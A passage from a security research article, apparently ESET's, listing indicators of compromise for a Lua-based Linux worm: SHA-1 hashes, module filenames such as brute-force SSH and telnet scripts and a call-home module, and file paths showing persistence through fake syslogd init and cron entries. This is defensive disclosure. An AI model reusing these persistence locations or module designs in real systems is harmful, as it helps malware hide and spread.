class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-22"><span class="crayon-e">a694c6ecc2ff9702905f22b14ed448e9e76fe531</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-23"><span class="crayon-e">ac094b239851eaf2e9fd309285c0996fb33771a8</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-24"><span class="crayon-e">b14f7af9665ef77af530109a0331f8ca0bd2a167</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-25"><span class="crayon-e">b86935c4539901cdec9081d8a8ca915903adaff1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-26"><span class="crayon-e">ba5df105496b0c4df7206d29fa544b7a7a346735</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-27"><span class="crayon-e">bf4d9e25fc210a1d9809aebb03b30748dd588d08</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-28"><span class="crayon-e">c22f0fb01c6d47957732a8b0f5ef0f7d4e614c79</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-29"><span class="crayon-e">ce4b3c92a96137e6215a5e2f5fd28a672eddaaab</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e2510020809-30"><span class="crayon-e">d8a5d9c4605b33bd47fedbad5a0da9928de6aa33</span></div><div class="crayon-line" id="crayon-60581b86282e2510020809-31"><span class="crayon-v">f73022a4801e06d675e5c3011060242af7b949ad</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->

</div>
</div>
<div class="listingblock">
<div class="title">
<div class="title">SHA-1 hashes (.dl)</div>
<div class="content">
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282e4198883235" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
274181d2f9c6b8f0e217db23f1d39aa94c161d6e
8abbb049bffd679686323160ca4b6a86184550a1
95444c2ccc5fff19145d60f1e817fd682cabe0cd
9cde845852653339f67667c2408126f02f246949</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282e4198883235-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e4198883235-2">2</div><div class="crayon-num" data-line="crayon-60581b86282e4198883235-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e4198883235-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282e4198883235-1"><span class="crayon-cn">274181d2f9c6b8f0e217db23f1d39aa94c161d6e</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e4198883235-2"><span class="crayon-cn">8abbb049bffd679686323160ca4b6a86184550a1</span></div><div class="crayon-line" id="crayon-60581b86282e4198883235-3"><span class="crayon-cn">95444c2ccc5fff19145d60f1e817fd682cabe0cd</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e4198883235-4"><span class="crayon-cn">9cde845852653339f67667c2408126f02f246949</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
</p>
<div class="title">Lua’s scripts filename</div>
<div class="content">
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282e5773214597" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
async.lua
async.lua.old
bencode.lua
bfssh.lua
bfssh.lua.old2
bftelnet.lua
btloader.lua
callhome.lua
callhome.lua.old
config.lua
crypto.lua
dht.lua
event.lua
evs.lua
http.lua
httpproto.lua
libevent2.lua
luaevent.lua
main.lua
main2.lua
malware.lua
persist.lua
readme.lua
routing.lua
scanner.lua
scanner2.lua
server.lua
socket.lua
socks.lua
ssh.lua
ssl.lua
telnet.lua
test.lua
test1.lua
test10.lua
test2.lua
test3.lua
test5.lua
test6.lua
threads.lua
torrent.lua
udp.lua
utils.lua
worm.lua</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282e5773214597-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-2">2</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-4">4</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-6">6</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-8">8</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-10">10</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-12">12</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-14">14</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-16">16</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-18">18</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-20">20</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-22">22</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-24">24</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-26">26</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-28">28</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-30">30</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-32">32</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-34">34</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-36">36</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-38">38</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-40">40</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-42">42</div><div class="crayon-num" data-line="crayon-60581b86282e5773214597-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e5773214597-44">44</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282e5773214597-1"><span class="crayon-v">async</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-2"><span class="crayon-v">async</span><span class="crayon-sy">.</span><span class="crayon-v">lua</span><span class="crayon-sy">.</span><span class="crayon-e">old</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-3"><span class="crayon-v">bencode</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-4"><span class="crayon-v">bfssh</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-5"><span class="crayon-v">bfssh</span><span class="crayon-sy">.</span><span class="crayon-v">lua</span><span class="crayon-sy">.</span><span class="crayon-e">old2</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-6"><span class="crayon-v">bftelnet</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-7"><span class="crayon-v">btloader</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-8"><span class="crayon-v">callhome</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-9"><span class="crayon-v">callhome</span><span class="crayon-sy">.</span><span class="crayon-v">lua</span><span class="crayon-sy">.</span><span class="crayon-e">old</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-10"><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-11"><span class="crayon-v">crypto</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-12"><span class="crayon-v">dht</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-13"><span class="crayon-v">event</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-14"><span class="crayon-v">evs</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-15"><span class="crayon-v">http</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-16"><span class="crayon-v">httpproto</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-17"><span class="crayon-v">libevent2</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-18"><span class="crayon-v">luaevent</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-19"><span class="crayon-v">main</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-20"><span class="crayon-v">main2</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-21"><span class="crayon-v">malware</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-22"><span class="crayon-v">persist</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-23"><span class="crayon-v">readme</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-24"><span class="crayon-v">routing</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-25"><span class="crayon-v">scanner</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-26"><span class="crayon-v">scanner2</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-27"><span class="crayon-v">server</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-28"><span class="crayon-v">socket</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-29"><span class="crayon-v">socks</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-30"><span class="crayon-v">ssh</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-31"><span class="crayon-v">ssl</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-32"><span class="crayon-v">telnet</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-33"><span class="crayon-v">test</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-34"><span class="crayon-v">test1</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-35"><span class="crayon-v">test10</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-36"><span class="crayon-v">test2</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-37"><span class="crayon-v">test3</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-38"><span class="crayon-v">test5</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-39"><span class="crayon-v">test6</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-40"><span class="crayon-v">threads</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-41"><span class="crayon-v">torrent</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-42"><span class="crayon-v">udp</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line" id="crayon-60581b86282e5773214597-43"><span class="crayon-v">utils</span><span class="crayon-sy">.</span><span class="crayon-e">lua</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e5773214597-44"><span class="crayon-v">worm</span><span class="crayon-sy">.</span><span class="crayon-v">lua</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->

</div>
</div>
</div>
</div>
</div>
<div class="sectionbody">
<div class="listingblock"></div>
<div class="listingblock">
<div class="title">Files that could potentially indicate an infection</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282e6517882305" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
/tmp/.local/*
/tmp/drop
/tmp/srv
$HOME/.local/ssh.txt
$HOME/.local/telnet.txt
$HOME/.local/nodes.cfg
$HOME/.local/check
$HOME/.local/script.bt
$HOME/.local/update.bt
$HOME/.local/server.bt
$HOME/.local/syslog
$HOME/.local/syslog.pid
$HOME/.local/{armv4l,i686,mips,mipsel}.dm
$HOME/.local/{armv4l,i686,mips,mipsel,powerpc}.lm

/etc/rc2.d/S04syslogd
/etc/rc3.d/S04syslogd
/etc/rc4.d/S04syslogd
/etc/rc5.d/S04syslogd
/etc/init.d/syslogd
/bin/syslogd
/etc/cron.hourly/syslogd</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282e6517882305-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-2">2</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-4">4</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-6">6</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-8">8</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-10">10</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-12">12</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-14">14</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-16">16</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-18">18</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-20">20</div><div class="crayon-num" data-line="crayon-60581b86282e6517882305-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282e6517882305-22">22</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282e6517882305-1"><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-2"><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-v">drop</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-3"><span class="crayon-o">/</span><span class="crayon-v">tmp</span><span class="crayon-o">/</span><span class="crayon-i">srv</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-4"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">ssh</span><span class="crayon-sy">.</span><span class="crayon-i">txt</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-5"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">telnet</span><span class="crayon-sy">.</span><span class="crayon-i">txt</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-6"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">nodes</span><span class="crayon-sy">.</span><span class="crayon-i">cfg</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-7"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-i">check</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-8"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">script</span><span class="crayon-sy">.</span><span class="crayon-i">bt</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-9"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">update</span><span class="crayon-sy">.</span><span class="crayon-i">bt</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-10"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">server</span><span class="crayon-sy">.</span><span class="crayon-i">bt</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-11"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-i">syslog</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-12"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">syslog</span><span class="crayon-sy">.</span><span class="crayon-i">pid</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-13"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-sy">{</span><span class="crayon-v">armv4l</span><span class="crayon-sy">,</span><span class="crayon-v">i686</span><span class="crayon-sy">,</span><span class="crayon-v">mips</span><span class="crayon-sy">,</span><span class="crayon-v">mipsel</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-i">dm</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-14"><span class="crayon-sy">$</span><span class="crayon-v">HOME</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-sy">{</span><span class="crayon-v">armv4l</span><span class="crayon-sy">,</span><span class="crayon-v">i686</span><span class="crayon-sy">,</span><span class="crayon-v">mips</span><span class="crayon-sy">,</span><span class="crayon-v">mipsel</span><span class="crayon-sy">,</span><span class="crayon-v">powerpc</span><span class="crayon-sy">}</span><span class="crayon-sy">.</span><span class="crayon-v">lm</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-15">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-16"><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">rc2</span><span class="crayon-sy">.</span><span class="crayon-v">d</span><span class="crayon-o">/</span><span class="crayon-v">S04syslogd</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-17"><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">rc3</span><span class="crayon-sy">.</span><span class="crayon-v">d</span><span class="crayon-o">/</span><span class="crayon-v">S04syslogd</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-18"><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">rc4</span><span class="crayon-sy">.</span><span class="crayon-v">d</span><span class="crayon-o">/</span><span class="crayon-v">S04syslogd</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-19"><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">rc5</span><span class="crayon-sy">.</span><span class="crayon-v">d</span><span class="crayon-o">/</span><span class="crayon-v">S04syslogd</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-20"><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">init</span><span class="crayon-sy">.</span><span class="crayon-v">d</span><span class="crayon-o">/</span><span class="crayon-v">syslogd</span></div><div class="crayon-line" id="crayon-60581b86282e6517882305-21"><span class="crayon-o">/</span><span class="crayon-v">bin</span><span class="crayon-o">/</span><span class="crayon-v">syslogd</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282e6517882305-22"><span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">cron</span><span class="crayon-sy">.</span><span class="crayon-v">hourly</span><span class="crayon-o">/</span><span class="crayon-v">syslogd</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->

</div>
</div>
</div>
</div>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mmalik/" title="Michal Malik">
                    Michal Malik                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2017-04-25 15:00:16">25 Apr 2017 - 03:00PM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
